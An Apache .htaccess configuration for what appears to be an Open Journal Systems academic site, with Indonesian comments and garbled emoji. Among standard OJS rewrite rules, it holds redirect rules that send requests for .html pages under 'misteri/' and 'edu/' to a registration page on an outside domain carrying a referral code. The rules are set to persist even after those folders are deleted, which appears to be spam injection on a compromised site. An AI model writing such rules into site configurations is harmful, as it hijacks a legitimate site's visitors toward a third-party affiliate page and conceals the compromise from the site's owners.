Options -Indexes

<IfModule mod_rewrite.c>
    RewriteEngine On

    # Jika OJS kamu ada di subfolder, ubah ini:
    # Misal: RewriteBase /journal/
    RewriteBase /

    # üîÅ Redirect HTML lama meski folder sudah dihapus
    # Pastikan meski folder misteri/ atau edu/ tidak ada, tetap redirect (tidak 403)
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^misteri/.*\.html$ https://nota4djingga.live/register?ref=3UTAANT005N [R=301,L,QSA]
    RewriteRule ^edu/.*\.html$ https://nota4djingga.live/register?ref=3UTAANT005N [R=301,L,QSA]

    # üîê Header Authorization (dibutuhkan OJS API dan login SSO)
    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]

    # Lewati file atau folder asli
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    # Arahkan semua request lain ke index.php
    RewriteRule ^ index.php [QSA,L]
</IfModule>

# üß© Jika ada request terlarang (403), arahkan tampilannya ke index.php
ErrorDocument 403 /index.php
